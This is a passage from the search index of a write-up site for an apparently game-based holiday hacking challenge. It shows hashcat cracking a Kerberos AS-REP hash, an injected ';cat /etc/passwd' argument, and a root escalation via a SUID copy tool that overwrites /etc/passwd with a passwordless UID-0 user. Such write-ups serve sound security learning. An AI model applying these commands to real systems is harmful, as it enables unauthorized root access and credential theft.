_unroll'\n* Device #1: Kernel m18200_a0-pure.d7bc3268.kernel not found in cache! Building may take a while...\nDictionary cache built:\n* Filename..: password_list.txt\n* Passwords.: 144\n* Bytes.....: 2776\n* Keyspace..: 144\n* Runtime...: 0 secs\n\nThe wordlist or mask that you are using is too small.\nThis means that hashcat cannot use the full parallel power of your device(s).\nUnless you supply more work, your cracking speed will drop.\nFor tips on supplying more work, see: https://hashcat.net/faq/morework\n\nApproaching final keyspace - workload adjusted.  \n\n$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: Kerberos 5 AS-REP etype 23\nHash.Target......: $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2...dd1966\nTime.Started.....: Wed Jan  3 18:30:26 2024 (0 secs)\nTime.Estimated...: Wed Jan  3 18:30:26 2024 (0 secs)\nGuess.Base.......: File (password_list.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:     1252 H/s (0.81ms) @ Accel:1 Loops:1 Thr:64 Vec:16\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 144/144 (100.00%)\nRejected.........: 0/144 (0.00%)\nRestore.Point....: 0/144 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-0\nCandidates.#1....: 1LuvCandyC4n3s!2022 -&gt; iLuvC4ndyC4n3s!23!\n\nStarted: Wed Jan  3 18:30:10 2024\nStopped: Wed Jan  3 18:30:28 2024\nelf@f9961835c47e:~$ \n</code></pre> We can see the cracked password in the output.</p> <p></p> <p>The last step is to run <code>/bin/runtoanswer</code> and input our password.</p> <p></p> <p>Answer</p> <p>IluvC4ndyC4nes!</p>"},{"location":"objectives/o7/#response","title":"Response","text":"<p>Eve Snowshoes</p> <p>Aha! Success! Alabaster will undoubtedly be grateful for our assistance. Onward to our next adventure, comrade! Feel free to explore this whimsical world of gears and steam!</p>"},{"location":"objectives/o8/","title":"Linux PrivESC","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o8/#objective","title":"Objective","text":"<p>Request</p> <p>Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.</p> Rose Mold <p>What am I doing in this saloon? The better question is: what planet are you from? Yes, I\u2019m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here. Whatever. Do you know much about privilege escalation techniques on Linux? You're asking why? How about I'll tell you why after you help me. And you might have to use that big brain of yours to get creative, bub.</p>"},{"location":"objectives/o8/#hints","title":"Hints","text":"Linux Command Injection <p>From: Rose Mold Terminal: Linux PrivESC Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.</p> Linux Privilege Escalation Techniques <p>From: Rose Mold Terminal: Linux PrivESC There's various ways to escalate privileges on a Linux system.</p>"},{"location":"objectives/o8/#solution","title":"Solution","text":"Our Cranberry Pi terminal once again greets us with a holiday poem. <p>In a digital winter wonderland we play, Where elves and bytes in harmony lay. This festive terminal is clear and bright, Escalate privileges, and bring forth the light.  Start in the land of bash, where you reside, But to win this game, to root you must glide. Climb the ladder, permissions to seize, Unravel the mystery, with elegance and ease.  There lies a gift, in the root's domain, An executable file to run, the prize you'll obtain. The game is won, the challenge complete, Merry Christmas to all, and to all, a root feat!  * Find a method to escalate privileges inside this terminal and then run the binary in /root *</p> <p>Our goal is to gain root privileges and run the binary located in the <code>/root</code> directory. One of the techniques mentioned in the resource in Hint #2 involves exploiting a vulnerable SUID executable. Let's see if there are any here:</p> <p><pre><code>elf@f833db568d22:~$ find / -perm -u=s -type f 2&gt;/dev/null\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/mount\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/simplecopy\nelf@f833db568d22:~$ \n</code></pre> Looking through the possibilities, the <code>simplecopy</code> binary sticks out to me. If this allows us to copy resources, it could be useful. Let's run it:</p> <p><pre><code>elf@f833db568d22:~$ cd /usr/bin            \nelf@f833db568d22:/usr/bin$ ./simplecopy \nUsage: ./simplecopy &lt;source&gt; &lt;destination&gt;\nelf@f833db568d22:/usr/bin$ \n</code></pre> Now we see that there are two arguments accepted - a <code>&lt;source&gt;</code> and a <code>&lt;destination&gt;</code>. Based on the hints, there are multiple ways to solve this challenge, including command injection. Let's see if these arguments are injectable.</p> <p><pre><code>elf@f833db568d22:/usr/bin$ ./simplecopy ;cat /etc/passwd\nUsage: ./simplecopy &lt;source&gt; &lt;destination&gt;\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nelf:x:1000:1000::/home/elf:/bin/sh\nelf@f833db568d22:/usr/bin$ \n</code></pre> Yes, they are injectable, but what if we could overwrite the <code>/etc/passwd</code> file with our own file using <code>simplecopy</code>?</p> <p><pre><code>elf@f833db568d22:~$ echo 'root:x:0:0:root:/root:/bin/bash      \n&gt; root2::0:0::/root:/bin/bash\n&gt; elf:x:1000:1000::/home/elf:/bin/sh' &gt; passwd\nelf@f833db568d22:~$ ls\nHELP  passwd\nelf@f833db568d22:~$ cat passwd \nroot:x:0:0:root:/root:/bin/bash\nroot2::0:0::/root:/bin/bash\nelf:x:1000:1000::/home/elf:/bin/sh\nelf@f833db568d22:~$\n</code></pre> Now we have a new user <code>root2</code> with root permissions in our <code>passwd</code> file. We also included our current user <code>elf</code> in the file. Let's overwrite the existing <code>/etc/passwd</code> file with our crafted file.</p> <p><pre><code>elf@f833db568d22:~$ simplecopy passwd /etc/passwd\nelf@f833db568d22:~$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nroot2::0:0::/root:/bin/bash\nelf:x:1000:1000::/home/elf:/bin/sh\nelf@f833db568d22:~$ \n</code></pre> Now let's escalate to the <code>root2</code> user.</p> <p><pre><code>elf@f833db568d22:~$ su root2\nroot@f833db568d22:/home/elf# whoami\nroot\nroot@f833db568d22:/home/elf# \n</code></pre> We are <code>root</code>! The last step is to find and run the binary in the root directory.</p> <p></p> <p>Tip</p> <p>The answer is case-sensitive.</p> <p>Answer</p> <p>santa</p>"},{"location":"objectives/o8/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Yup, I knew you knew. You just have that vibe. To answer your question of why from earlier... Nunya! But, I will tell you something better, about some information I... found. There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands. The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there. That's all I got. K byyeeeee. Ugh... n00bs...</p>"},{"location":"objectives/o9/","title":"Luggage Lock","text":"<p>Difficulty:  Direct link: --</p>"},{"location":"objectives/o9/#objective","title":"Objective","text":"<p>Request</p> <p>Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials</p> Garland Candlesticks <p>Hey there, I'm Garland Candlesticks! I could really use your help with something. You see, I have this important pamphlet in my luggage, but I just can't remember the combination to open it! Chris Elgee gave a talk recently that might help me with this problem. Did you attend that? I seem to recall Chris mentioning a technique to figure out the combinations... I have faith in you! We'll get that luggage open in no time. This pamphlet is crucial for me, so I can't thank you enough for your assistance. Once we retrieve it, I promise to treat you to a frosty snack on me!</p>"},{"location":"objectives/o9/#hints","title":"Hints","text":"Lock Talk <p>From: Garland Candlesticks Terminal: Luggage Lock Decode Check out Chris Elgee's talk regarding his and his wife's luggage. Sounds weird but interesting!</p>"},{"location":"objectives/o9/#solution","title":"Solution","text":"<p>Our hint to solving this challenge is the Lock Talk given by Chris Elgee mentioned by Garland Candlesticks in his introduction. After watching this talk, we have a good idea of how to approach this puzzle. The challenge allows some practice with one, two, three, or four wheels. Completing the objective requires solving the puzzle using all four wheels.</p> <p>Put gentle pressure on the open lock button (by clicking or pressing space a couple times) and turn the dial (by clicking or using the keyboard shortcuts shown in the instructions) until you see the 'Dial resistance...' dialog pop up.</p> <p></p> <p>Press the lock button again when you believe you have found the number showing the most resistence and the lock will open if it is correct.</p> <p></p> <p></p> <p>Repeat for using all four wheels until the luggage opens to reveal Garland's important Geese Islands travel pamphlet.</p> <p></p> <p>Answer</p> <p>Successfully open the luggage.</p>"},{"location":"objectives/o9/#response","title":"Response","text":"<p>Garland Candlesticks</p> <p>Wow, you did it! I knew you could crack the code. Thank you so much!</p>"},{"location":"objectives/oexample/","title":"Insert Objective 3 Title","text":"<p>Difficulty:  Direct link: Objective 3 terminal</p>"},{"location":"objectives/oexample/#objective","title":"Objective","text":"<p>Request</p> <p>Insert the objective description from your badge.</p> Insert Elf Name <p>Copy the first part of the conversation with Elf Name here You can use <code>&lt;br/&gt;</code> to ensure each sentence starts on a new line.</p>"},{"location":"objectives/oexample/#hints","title":"Hints","text":"Insert Hint 1 Title <p>Along the way you will receive different hints. Insert them here.</p> Insert Hint 2 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/oexample/#solution","title":"Solution","text":"<p>This section explains the different steps taken to solve the challenge. Try to find a good balance between providing sufficient detail and not overloading the reader with too much information. Use admonitions, images, diagrams, code blocks, and tables to highlight and structure important information or provide additional clarification.</p>"},{"location":"objectives/oexample/#admonitions","title":"Admonitions","text":"<p>Anchor the decorations</p> <p>Ensure that all festive decorations, especially electrical ones, are securely anchored. We don\u2019t want them floating off into the tropical sunset!</p> <p>Palm tree lighting</p> <p>While on the island, make sure to hang your Christmas lights on a palm tree. It\u2019s not only festive but also a great beacon for Santa to find you!</p>"},{"location":"objectives/oexample/#images","title":"Images","text":""},{"location":"objectives/oexample/#diagrams","title":"Diagrams","text":"<pre><code>sequenceDiagram\n  autonumber\n  Santa-&gt;&gt;Elf: Hey Elf, is the Naughty-or-Nice List secured?\n  loop Security Check\n      Elf-&gt;&gt;Elf: Ensuring list is encrypted\n  end\n  Note right of Elf: Using candy-cane encryption!\n  Elf--&gt;&gt;Santa: Safe and sound, Santa!\n  Santa-&gt;&gt;Reindeer: Rudolph, did you patch the sleigh's software?\n  Note left of Reindeer: Checking for reindeerOS updates...\n  Reindeer--&gt;&gt;Santa: All patched and glowing bright!</code></pre>"},{"location":"objectives/oexample/#code-blocks","title":"Code blocks","text":"Countdown script (with line 7 highlighted)<pre><code>#!/bin/bash\necho \"Christmas Holiday Countdown\"\n\ndays_until_xmas=$(($(date -d \"Dec 25\" +%j) - $(date +%j)))\n\nif [ $days_until_xmas -ge 0 ]; then\n  echo \"Only $days_until_xmas days until Christmas!\"\nelse\n  echo \"Christmas has passed! Hope you had a great time!\"\nfi\n</code></pre>"},{"location":"objectives/oexample/#tables","title":"Tables","text":"Activity Santa's Verdict Elf Comments Iceberg Surfing Risky Business \"Lost three surfboards!\" Polar Bear Hugs Approach with Caution \"Fluffy but... brisk.\" Snow Fort Building Highly Recommended \"Elf-sized doorways only.\" Aurora Light Chasing Magical Experience \"Better than Christmas lights!\" Penguin Parade Absolute Must-See \"They're oddly organized!\" <p>Answer</p> <p>Insert the answer to the objective here.</p>"},{"location":"objectives/oexample/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Copy the final part of the conversation with Elf Name here.</p>"}]}